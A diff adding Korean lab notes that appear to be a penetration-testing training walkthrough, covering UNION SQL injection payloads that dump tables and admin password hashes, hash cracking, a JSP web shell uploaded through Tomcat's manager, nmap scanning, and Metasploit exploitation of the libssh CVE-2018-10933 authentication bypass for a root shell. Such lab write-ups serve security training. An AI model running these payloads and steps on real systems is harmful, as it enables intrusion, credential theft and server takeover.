@@ -175,6 +175,27 @@ cat /root/.bash_history
 
 2. ') UNION ~ ; # 구문 이용 SQL Injection (Day2 웹 UNION SQL Injection 문제와 구문은 동일)
 
+3. 추가적으로 UNION SQL Injection 수행하여 정보 얻어내기
+
+4. pw 해시값
+  - 칼리 터미널 john the reaper(패스워드 크랙 툴) 사용 / john 파일명
+  - 해시값 인터넷 검색도 가능
+
+5. kali 내 jsp 웹쉘 스크립트 경로: /usr/share/webshell/jsp 내 cmdjsp.jsp 파일 사용 // WAR 압축파일로 만들어서 업로드
+(Day2 17번 Tomcat Admin 실습 내용과 동일)
+웹쉘의 동작 조건 2가지
+- 1. 웹쉘 업로드 / 파일 업로드 취약점
+- 2. 웹쉘에 접근 가능
+
+6. key : conn   find / -name abcdef
+
+7. nmap 활용 (칼리 터미널에서) libssh
+
+8. 메타스플로잇 활용 (search libssh, show options, set 옵션, run)
+- set rhost : ip 주소
+- set rport : 포트번호
+- set spawn_pty true : 가상의 터미널 여는 옵션
+- 세션이 열리면 sessions -i : 열려있는 세션 확인, sessions -i 세션 넘버 // 쉘 열림
 ```
 
 **시나리오 흐름도**
@@ -188,4 +209,158 @@ cat /root/.bash_history
 7. 취약점 확인
 8. 서버 장악
 
-### 1) 
+### 1) 취약점 확인
+
+회원 가입 후, 메모 조회 기능에 임의 문자열('#) 입력 후 반응 보기 -> SQL Injection 취약점
+```
+') or 1 = 1 ; #
+```
+타 사용자의 메모를 조회할 수 있음.
+
+***
+
+### 2) DB 정보 확인
+
+DB 정보를 찾기 위해 먼저
+```
+') UNION SELECT 1, 2, table_name, 4 FROM information_schema.tables WHERE table_type='base table' ; #
+```
+입력하여 'f14g'라는 테이블 이름 알아내기
+
+***
+
+### 3) 데이터 탈취
+
+'f14g' 테이블의 컬럼명 알아내기
+```
+') UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name='f14g' ; #
+```
+입력하여 'flag'라는 컬럼명을 알아내고, 조회된 컬럼명을 토대로 컬럼값을 조회해본다.
+```
+') UNION SELECT 1, 2, flag, 4 FROM f14g ; #
+```
+
+***
+
+### 4) 관리자 계정 탈취
+
+member라는 테이블에 계정 정보가 들어있다는 정보를 알고 있을 때,
+```
+') UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name='member' ; #
+```
+no, id, pw라는 컬럼을 가지고 있는 table임을 알 수 있음.
+
+```
+') UNION SELECT 1, 2, id, pw FROM member ; #
+```
+관리자의 id와 pw를 알 수 있음.
+
+pw는 해시 함수로 암호화 되어있기 때문에, john the reaper 방식을 이용해서 패스워드 크래킹을 진행하거나, 인터넷에 나와있는 툴로 진행한다.
+
+***
+
+### 5) 서버 장악
+
+ip주소:포트/manage/html 주소로 들어왔을 때, 얻어낸 관리자 계정으로 로그인 가능.
+
+로그인 후, 관리자 페이지 내에서 Deploy 기능을 확인한다.
+
+웹 쉘 업로드를 위해 kali에 내장되어 있는 /usr/share/webshell/jsp/cmdjsp.jsp 파일을 사용한다.
+```
+jar cvf webshell.war cmdjsp.jsp
+```
+WAR 파일로 변환시켜준 후, 업로드한다.
+
+웹 쉘을 통해 서버 내 저장된 파일들의 정보를 확인한다.
+
+***
+
+### 6) 정보 탈취
+
+/tomcat7/webapps/ROOT/index.jsp
+
+경로에 있는 DB 접속 파일을 확인한다.
+
+```
+얻을 수 있는 정보
+1) DB IP 주소
+2) DB 사용자의 ID
+3) DB 사용자의 PW
+```
+
+***
+
+### 7) 취약점 확인
+
+```
+nmap -sV IP주소
+```
+```
+2222/tcp open  ssh  libssh 0.8.1
+```
+명령어를 통해 DB서버에 포트 스캔을 진행하고, SSH와 DB 포트가 오픈되어 있음을 알 수 있다.
+
+SSH 연결을 시도하여, 어플리케이션 이름과 버전을 확인한다.
+
+***
+
+### 8) 서버 장악
+
+**힌트**
+CVE-2018-10933은 libssh 라이브러리의 치명적인 인증 우회 취약점.
+
+공격자는 비밀번호나 키 없이도 SSH 인증을 우회하여 루트 쉘을 획득할 수 있다.
+
+libssh는 내부적으로 SSH2_MSG_USERAUTH_SUCCESS 메시지를 클라이언트 → 서버 방향으로 처리해버림.
+
+즉, 공격자가 서버에게 "나 인증됐음!" 이라고 말하면 서버가 그걸 믿어버림.
+
+```
+msfconsole
+```
+메타스플로잇 실행시켜서 콘솔 열어주기
+
+```
+search libssh
+```
+libssh 찾고
+
+```
+use 0
+```
+0번 리스트에 있다.
+
+```
+set RHOST ip주소
+```
+ip 주소를 설정하고,
+
+```
+set RPORT 포트번호
+```
+포트 번호를 설정하고,
+
+```
+set SPAWN_PTY true
+```
+익스플로잇이 성공했을 때 가상 터미널(PTY) 을 생성해준다.
+
+```
+exploit
+```
+프로그램 시작
+
+```
+sessions -i 1
+```
+익스플로잇을 성공하고 세션에 연결
+
+```
+id
+```
+입력 시, root임을 확인.
+
+결과적으로, CVE-2018-10933을 이용하여 공격자 서버를 장악 성공
+
+***
+
